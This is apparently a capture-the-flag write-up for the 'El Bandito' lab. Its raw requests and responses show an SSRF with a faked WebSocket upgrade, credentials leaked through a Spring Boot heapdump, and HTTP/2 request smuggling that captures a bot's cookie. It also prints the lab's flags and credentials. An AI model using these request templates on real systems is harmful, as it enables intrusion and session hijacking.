# El Bandito

## TASK

```
root@ip-10-82-97-239:~# nmap 10.82.181.53 -sS -Pn -p- -T4 -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-12 12:12 GMTNmap scan report for 10.82.181.53
Host is up (0.0033s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  ssl/http El Bandito Server
631/tcp  open  ipp      CUPS 2.4
8080/tcp open  http     nginx
```

## TASK

```
root@ip-10-82-97-239:~# ffuf -u https://10.82.181.53:80/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : https://10.82.181.53:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 58, Words: 5, Lines: 1]
access                  [Status: 200, Size: 4817, Words: 289, Lines: 116]
login                   [Status: 405, Size: 153, Words: 16, Lines: 6]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6]
messages                [Status: 302, Size: 189, Words: 18, Lines: 6]
ping                    [Status: 200, Size: 4, Words: 1, Lines: 1]
save                    [Status: 405, Size: 153, Words: 16, Lines: 6]
static                  [Status: 301, Size: 169, Words: 5, Lines: 8]
:: Progress: [4614/4614] :: Job [1/1] :: 1522 req/sec :: Duration: [0:00:03] :: Errors: 0 ::

root@ip-10-82-97-239:~# gobuster dir -u http://10.82.181.53:8080/ -w /usr/share/wordlists/dirb/big.txt -b 300-500
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.82.181.53:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   438,334,399,479,492,495,307,420,387,401,493,335,326,328,330,336,449,475,337,400,441,484,499,313,395,453,316,368,462,372,422,429,451,498,323,458,464,402,417,314,331,340,403,411,425,361,375,322,354,410,421,327,382,497,325,472,480,461,496,350,406,428,445,490,303,356,310,393,302,365,384,426,443,448,343,366,405,437,311,386,324,433,359,333,344,380,424,306,404,434,470,489,485,412,435,379,397,457,466,494,351,345,431,444,476,427,398,407,439,454,348,349,373,390,418,338,385,394,321,467,463,308,486,488,305,319,332,362,450,318,381,440,358,369,452,478,352,396,432,377,408,392,347,391,491,309,468,339,469,477,320,376,430,456,474,363,374,459,353,415,436,481,357,364,500,360,355,304,300,473,414,371,383,442,367,346,378,482,341,471,342,409,413,416,447,315,389,465,487,483,312,317,329,301,423,446,370,419,455,460,388
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 200) [Size: 0]
/favicon.ico          (Status: 200) [Size: 946]
/health               (Status: 200) [Size: 150]
/info                 (Status: 200) [Size: 2]
/token                (Status: 200) [Size: 7]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

## TASK

```
root@ip-10-82-97-239:~# curl -v http://10.82.181.53:80
*   Trying 10.82.181.53:80...
* TCP_NODELAY set
* Connected to 10.82.181.53 (10.82.181.53) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.82.181.53
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Recv failure: Connection reset by peer
* Closing connection 0
curl: (56) Recv failure: Connection reset by peer

root@ip-10-82-97-239:~# curl -v https://10.82.181.53:80
*   Trying 10.82.181.53:80...
* TCP_NODELAY set
* Connected to 10.82.181.53 (10.82.181.53) port 80 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (OUT), TLS alert, unknown CA (560):
* SSL certificate problem: self signed certificate
* Closing connection 0
curl: (60) SSL certificate problem: self signed certificate
More details here: https://curl.haxx.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.

root@ip-10-82-97-239:~# curl -k https://10.82.181.53:80
nothing to see <script src='/static/messages.js'></script>root@ip-10-82-97-239:~# 
```

## TASK

https://10.82.181.53:80/access      : A https login page

http://10.82.181.53:8080/assets     : A http link to download empty file

http://10.82.181.53:8080/health     : A http link containing {"status":"UP","diskSpace":{"status":"UP","total":51963551744,"free":30524125184,"threshold":10485760},"db":{"status":"UP","database":"H2","hello":1}}
                                      Turns out it's a Spring Boot Actuator endpoint!

http://10.82.181.53:8080/info       : A http link containing {}

http://10.82.181.53:8080/token      : A http page containing token 3273.254

http://10.82.181.53:8080/burn.html  : A http page containing js script

## TASK

Some has header 'Connection: keep-alive'

http://10.82.131.88:8080/burn.html make /ws request, including 'Pragma: no cache' and 'Upgrade: websocket'

Inspecting our DevTools we notice a refused WebSocket connection. 
In other words the client script that should handle the form isn’t loading and the socket seems to be down.
The JavaScript in the page source confirms that burn.html was meant to use a WebSocket for token burning, but since the service is intentionally disabled, the page is just a dead end for now:

```javascript
/*************************************************************************************
*       const date = new Date().getFullYear();
*       document.getElementById("current-date").innerHTML = date;
*
*       $(document).ready(function () {
*     var webSocket;
*     var wsUri = (window.location.protocol === 'https:' ? 'wss://' : 'ws://') + window.location.host + '/ws'; // Adjust the '/ws' if your WebSocket endpoint differs
*     function initWebSocket() {
*         webSocket = new WebSocket(wsUri);
*
*         webSocket.onopen = function(event) {
*             console.log("WebSocket is open now.");
*         };
*
*         webSocket.onmessage = function(event) {
*             console.log("Message from server: ", event.data);
*             $("#response").text(event.data); // Displaying the response from the server
*         };
*
*         webSocket.onerror = function(event) {
*             console.error("This service is not working on purpose ;)", event);
*         };
*
*         webSocket.onclose = function(event) {
*             console.log("WebSocket is closed now.");
*         };
*     }
*
*     initWebSocket();
*
*     // Form submission with WebSocket
*     $("#token-burn").submit(function (event) {
*         event.stopPropagation();
*         event.preventDefault();
*         console.log("here");
*
*         if(webSocket.readyState === WebSocket.OPEN) {
*             var message = {
*                 action: "burn",
*                 address: $("#address").val(),
*                 amount: $("#amount").val()
*             };
*             WebSocket.send(JSON.stringify(message));
*         } else {
*             console.error("WebSocket is not open.");
*         }
*     });
* });
*************************************************************************************/
```

## TASK See whether SSRF feasible

1. Start HTTP Server

    ```
    root@ip-10-82-64-151:~# python3 -m http.server 8088
    Serving HTTP on 0.0.0.0 port 8088 (http://0.0.0.0:8088/) ...
    ```

2. Send GET Request to HTTP Server

    ```
    GET /isOnline?url=http://10.82.64.151:8088 HTTP/1.1
    Host: 10.82.131.88:8080
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Referer: http://10.82.131.88:8080/services.html
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-GB,en;q=0.9,zh-GB;q=0.8,zh;q=0.7,en-US;q=0.6
    If-Modified-Since: Wed, 20 Mar 2024 23:10:13 GMT
    Connection: keep-alive
    ```

3. Receive response from http server

    ```
    HTTP/1.1 200 
    Server: nginx
    Date: Mon, 12 Jan 2026 14:58:51 GMT
    Content-Type: text/plain
    Content-Length: 0
    Connection: keep-alive
    X-Application-Context: application:8081
    ```

    ```
    root@ip-10-82-64-151:~# python3 -m http.server 8088
    Serving HTTP on 0.0.0.0 port 8088 (http://0.0.0.0:8088/) ...
    10.82.131.88 - - [12/Jan/2026 14:45:43] "GET / HTTP/1.1" 200 -
    ```

## TASK Trick the server to believe WebSocket upgraded

1. Set up a web server that responds with status 101 to every request

    ```
    root@ip-10-82-64-151:~# python3 myserver.py 5555
    ```

2. Send GET Request to HTTP Server

    ```
    GET /isOnline?url=http://10.82.64.151:5555 HTTP/1.1
    Host: 10.82.131.88:8080
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://10.82.131.88:8080/services.html
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-GB,en;q=0.9,zh-GB;q=0.8,zh;q=0.7,en-US;q=0.6
    If-Modified-Since: Wed, 20 Mar 2024 23:10:13 GMT
    Connection: keep-alive
    ```

3. Receive response from myserver

    ```
    HTTP/1.1 101 
    Server: nginx
    Date: Mon, 12 Jan 2026 14:56:07 GMT
    Connection: upgrade
    X-Application-Context: application:8081
    ```

    ```
    root@ip-10-82-64-151:~# python3 myserver.py 5555
    10.82.131.88 - - [12/Jan/2026 14:56:08] "GET / HTTP/1.1" 101 -
    ```

## TASK Look for common springboot file

```
root@ip-10-82-64-151:~# gobuster dir -u http://10.82.131.88:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt -b 300-500 -x .json
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.82.131.88:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt
[+] Negative Status codes:   339,351,369,381,475,413,490,457,307,315,319,328,332,334,426,437,330,370,416,447,458,329,349,375,376,406,492,314,338,421,451,305,368,398,427,485,495,496,395,435,466,300,365,371,448,455,356,397,444,431,473,302,352,400,404,445,446,325,331,415,422,470,385,452,463,480,493,306,308,481,327,341,399,478,483,317,476,388,321,358,361,364,419,460,464,497,433,311,323,324,347,367,401,436,304,386,387,405,417,487,320,353,382,423,439,310,346,403,465,471,499,432,316,377,482,374,472,479,396,412,450,491,345,407,418,443,390,449,484,498,318,322,342,363,420,486,391,410,373,414,438,462,489,348,488,360,453,357,384,409,379,424,408,441,477,362,392,350,378,411,425,380,303,343,344,335,336,337,393,494,428,429,312,383,326,359,389,461,372,440,467,474,340,366,442,456,459,309,402,430,468,500,394,434,469,301,313,333,354,355,454
[+] User Agent:              gobuster/3.6
[+] Extensions:              json
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/health.json          (Status: 200) [Size: 150]
/health               (Status: 200) [Size: 150]
/info                 (Status: 200) [Size: 2]
/info.json            (Status: 200) [Size: 2]
/mappings             (Status: 200) [Size: 4499]
/mappings.json        (Status: 200) [Size: 4499]
/configprops          (Status: 200) [Size: 12018]
/configprops.json     (Status: 200) [Size: 12018]
/heapdump             (Status: 200) [Size: 13158962]
/heapdump.json        (Status: 200) [Size: 13297052]

===============================================================
Finished
===============================================================
```

## TASK

heapdump.json, configprops.json and mapping.json can be access via browser.
heapdump.json will download a zip file, containing username:hAckLIEN and password:YouCanCatchUsInYourDreams404
mappings.json contains all path names.

admin-flag and admin-creds cannot be access via browser, but can be request via our tricked websocket.

    admin-flag request
        ```
        GET /isOnline?url=http://10.82.64.151:5555 HTTP/1.1
        Host: 10.82.131.88:8080
        Sec-WebSocket-Version: 13
        Upgrade: WebSocket
        Connection: Upgrade

        GET /admin-flag HTTP/1.1
        Host: 10.82.181.88:8080
        ```

    admin-flag response
        ```
        HTTP/1.1 101 
        Server: nginx
        Date: Mon, 12 Jan 2026 15:55:39 GMT
        Connection: upgrade
        X-Application-Context: application:8081

        HTTP/1.1 200 
        X-Application-Context: application:8081
        Content-Type: text/plain
        Content-Length: 43
        Date: Mon, 12 Jan 2026 15:55:39 GMT

        THM{:::MY_DECLINATION:+62°_14'_31.4'':::}
        ```

    admin-creds request
        ```
        GET /isOnline?url=http://10.82.64.151:5555 HTTP/1.1
        Host: 10.82.131.88:8080
        Sec-WebSocket-Version: 13
        Upgrade: WebSocket
        Connection: Upgrade

        GET /admin-creds HTTP/1.1
        Host: 10.82.181.88:8080
        ```

    admin-creds response
        ```
        HTTP/1.1 101 
        Server: nginx
        Date: Mon, 12 Jan 2026 15:53:35 GMT
        Connection: upgrade
        X-Application-Context: application:8081

        HTTP/1.1 200 
        X-Application-Context: application:8081
        Content-Type: text/plain
        Content-Length: 55
        Date: Mon, 12 Jan 2026 15:53:35 GMT

        username:hAckLIEN password:YouCanCatchUsInYourDreams404
        ```

## TASK See if HTTP/2 can be smuggle

Method 1:

    a. Login to https://10.82.131.88:80, send a message and observe HTTP/2 is used through Burp.

    b.  Disable update Content-Length and add a Content-Length with large value.
        Using a small Content-Length may POST partial data successfully, but large will cause error.
        ```
        POST /send_message HTTP/2
        Host: 10.82.131.88:80
        Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aWUVnA.VH7EsyLpAX_R04VuIak5N-LDP7M
        Sec-Ch-Ua-Platform: "Windows"
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
        Content-Type: application/x-www-form-urlencoded
        Sec-Ch-Ua-Mobile: ?0
        Accept: */*
        Origin: https://10.82.131.88:80
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: cors
        Sec-Fetch-Dest: empty
        Referer: https://10.82.131.88:80/messages
        Accept-Encoding: gzip, deflate, br
        Accept-Language: en-GB,en;q=0.9,zh-GB;q=0.8,zh;q=0.7,en-US;q=0.6
        Priority: u=1, i
        Content-Length: 100

        data=fuck
        ```

    c.  Since HTTP/2 ignores Content-Length headers, this error strongly suggests that the proxy downgraded our HTTP/2 request to HTTP/1.1 before passing it to the backend, where our malformed Content-Length was parsed and caused the failure. 
        This confirms the presence of an HTTP/2 to HTTP/1.1 downgrade path and a desync opportunity.
        Varnish also doesn’t handle HTTP/2 directly and instead relies on a frontend proxy to downgrade HTTP/2 to HTTP/1.1.
        ```
        HTTP/2 503 Service Unavailable
        Date: Mon, 12 Jan 2026 16:10:26 GMT
        Content-Type: text/html; charset=utf-8
        Retry-After: 5
        Age: 0
        Server: El Bandito Server
        Content-Length: 283

        <!DOCTYPE html>
        <html>
            <head>
                <title>503 Backend fetch failed</title>
            </head>
            <body>
                <h1>Error 503 Backend fetch failed</h1>
                <p>Backend fetch failed</p>
                <h3>Guru Meditation:</h3>
                <p>XID: 165588</p>
                <hr>
                <p>Varnish cache server</p>
            </body>
        </html>
        ```

Method 2:

    a.  Send message with Content-Length 0, the second Get /ping will be queue.
        ```
        POST /send_message HTTP/2
        Host: 10.82.131.88:80
        Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aWUVnA.VH7EsyLpAX_R04VuIak5N-LDP7M
        Content-Length: 0
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36

        GET /ping HTTP/1.1
        Foo: x
        ```

    b.  First response is normal.
        ```
        HTTP/2 200 OK
        Date: Mon, 12 Jan 2026 16:31:40 GMT
        Content-Type: application/json
        Content-Length: 54
        Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
        X-Content-Type-Options: nosniff
        X-Frame-Options: SAMEORIGIN
        X-Xss-Protection: 1; mode=block
        Feature-Policy: microphone 'none'; geolocation 'none';
        Age: 0
        Server: El Bandito Server
        Accept-Ranges: bytes

        {"status":"Message received and stored successfully"}
        ```

    c.  Quickly send second time, the queue GET /ping is process and return 
        ```
        HTTP/2 200 OK
        Date: Mon, 12 Jan 2026 16:31:55 GMT
        Content-Type: text/html; charset=utf-8
        Content-Length: 4
        Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
        X-Content-Type-Options: nosniff
        X-Frame-Options: SAMEORIGIN
        X-Xss-Protection: 1; mode=block
        Feature-Policy: microphone 'none'; geolocation 'none';
        Age: 0
        Server: El Bandito Server
        Accept-Ranges: bytes

        pong
        ```

Hint: The last flag is hidden in Jack's cookie.

## TASK Understand message.js

To do that we crafted an HTTP/2 request with a deliberately "too short" Content-Length and appended a second request (POST /send_message). 
The idea was that if the backend trusted the header, it would parse the first request and treat the rest as a new one. 
However, when refreshing /getMessages we only saw null entries in the chat, indicating the payload structure was incorrect but the desync bug was likely working.

Looking back at messages.js, we saw that the chat application automatically fetchs for/getMessages on each page load and submits outgoing messages via /send_message. 
This meant that background traffic was very likely happening from other users or bots. 
Combined with our confirmed desync bug, we suspected that if the backend was left waiting for extra bytes, the next incoming request from either the user or the bot could end up being appended to our smuggled request body. 
This could lead to us being able to get the person's cookie and possibly login as another user.

```javascript
// Function to fetch messages from the server
function fetchMessages() {
  fetch("/getMessages")
    .then((response) => {
      if (!response.ok) {
        throw new Error("Failed to fetch messages");
      }
      return response.json();
    })
    .then((messages) => {
      userMessages = messages;
      userMessages.JACK === undefined
        ? (userMessages = { OLIVER: messages.OLIVER, JACK: [] })
        : userMessages.OLIVER === undefined &&
          (userMessages = { JACK: messages.JACK, OLIVER: [] });

      displayMessages("JACK");
    })
    .catch((error) => console.error("Error fetching messages:", error));
}

fetch("/send_message", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "data=" + messageText
})
```

Good to know: 

This kind of attack only works if the proxy server and the backend server maintain a persistent connection. 
This means the same connection is reused for all requests sent. 
Otherwise, the connection is closed after each request. In that case, there’s no “window” for your smuggled request to remain in.

## TASK Use large Content-Length to make server wait, then bot in message.js will append their /get_message request into our /send_message request, along with bot/Jack cookie.

So what we did next was that we flipped the approach and tried the opposite. 
We sent an HTTP/2 request with a deliberately oversized Content-Length. 
By setting the header to a value larger than the actual body, the backend would keep waiting for more bytes. 
This opened a window where the next incoming request from either the user or the bot hitting the server could get appended to our smuggled request body. 
This could lead to us being able to get the person's cookie and possibly login as another user.

1.  Send the request below, the response stuck for a while means good.

    ```
    GET /getMessages HTTP/2
    Host: 10.82.131.88:80
    Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aWUVnA.VH7EsyLpAX_R04VuIak5N-LDP7M
    Sec-Ch-Ua-Platform: "Windows"
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
    Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
    Sec-Ch-Ua-Mobile: ?0
    Accept: */*
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://10.82.131.88:80/messages
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-GB,en;q=0.9,zh-GB;q=0.8,zh;q=0.7,en-US;q=0.6
    Priority: u=1, i
    ```

2.  Send the request below

    ```
    GET /getMessages HTTP/2
    Host: 10.82.131.88:80
    Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aWUVnA.VH7EsyLpAX_R04VuIak5N-LDP7M
    Sec-Ch-Ua-Platform: "Windows"
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
    Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
    Sec-Ch-Ua-Mobile: ?0
    Accept: */*
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://10.82.131.88:80/messages
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-GB,en;q=0.9,zh-GB;q=0.8,zh;q=0.7,en-US;q=0.6
    Priority: u=1, i
    ```

3.  If successful
    ```
    HTTP/2 200 OK
    Date: Mon, 12 Jan 2026 16:56:51 GMT
    Content-Type: application/json
    Content-Length: 1146
    Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
    X-Content-Type-Options: nosniff
    X-Frame-Options: SAMEORIGIN
    X-Xss-Protection: 1; mode=block
    Feature-Policy: microphone 'none'; geolocation 'none';
    Age: 0
    Server: El Bandito Server
    Accept-Ranges: bytes
    {"JACK":["The Galactic Enforcement's quantum sniffers are onto us, tracing our blockchain exploits.","They're using predictive analytics, thinking they're ahead in a 4D chess game across the blockchain.","You need to jump now! Awaiting your signal to close the portal.","fuck u","fuck u",null,null,"","fuckk",null,"","fuck",null,null,null,null,null,null,null,null,null,null,"\r\n\r\nGET /access HTTP/1.1\r\nhost: bandito.public.thm:80\r\nscheme: https\r\nsec-ch-ua: \"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"HeadlessChrome\";v=\"122\"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \"Linux\"\r\nupgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.128 Safari/537.36\r\naccept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nsec-fetch-site: none\r\nsec-fetch-mode: navigate\r\nsec-fetch-user: ?1\r\nsec-fetch-dest: document\r\naccept-encoding: gzip, deflate, br\r\ncookie: flag=THM{\u00a1!\u00a1RIGHT_ASCENSION_12h_36m_25.46s!\u00a1!}\r\nX-F"],"OLIVER":[]}
    ```

## Appendix: